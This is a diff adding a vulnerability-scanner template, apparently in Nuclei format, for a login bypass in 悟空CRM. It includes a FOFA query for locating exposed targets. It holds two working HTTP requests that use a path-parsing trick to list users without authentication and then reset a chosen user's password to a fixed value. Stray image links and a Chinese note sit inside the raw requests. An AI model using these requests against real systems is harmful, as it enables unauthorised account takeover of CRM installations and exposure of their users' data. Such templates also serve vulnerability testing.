@@ -1,0 +1,26 @@
+id: poc-oqhiw4mqg9pxn1zk
+info:
+  name: 悟空CRM queryUserList 存在登录绕过漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/oqhiw4mqg9pxn1zk'
+  tags: unauth,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: oqhiw4mqg9pxn1zk
+    fofa: body="悟空CRM" && product="悟空CRM"
+http:
+- raw:
+  - "POST /adminUser/queryUserList///;name=/v2/api-docs HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\n\n{\n    \"page\": 1,\n    \"limit\": 10\n}\n![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1772372381887-3fe8cdf5-9e80-4532-ab96-9b9f157bb1ff.png)\n根据第一步获取的userid进行密码重置"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - "POST /adminUser/resetPassword///;name=/v2/api-docs HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\n\n{\n    \"ids\": [10],\n    \"password\": \"lodnyefhak9813@!adsf\"\n}\n![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1772372382176-02279f5c-6f05-40f8-ae59-549c848d5024.png)"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
